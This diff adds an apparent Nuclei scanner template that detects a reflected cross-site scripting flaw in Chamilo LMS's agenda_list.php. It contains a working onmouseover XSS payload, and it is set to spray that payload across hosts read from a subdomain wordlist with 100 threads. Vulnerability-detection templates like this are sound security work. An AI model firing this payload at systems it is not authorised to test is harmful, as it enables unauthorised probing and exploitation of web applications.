@@ -1,0 +1,32 @@
+id: chamilo-lms-xss
+info:
+  name: Chamilo LMS Cross Site Scripting
+  author: geeknik
+  severity: medium
+  description: https://www.netsparker.com/web-applications-advisories/ns-21-001-cross-site-scripting-in-chamilo-lms/
+  tags: xss,chamilo
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+    raw:
+      - |
+        GET /main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+" HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'agenda_js.php?type=xss" onmouseover=alert(document.domain)'
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "text/html"
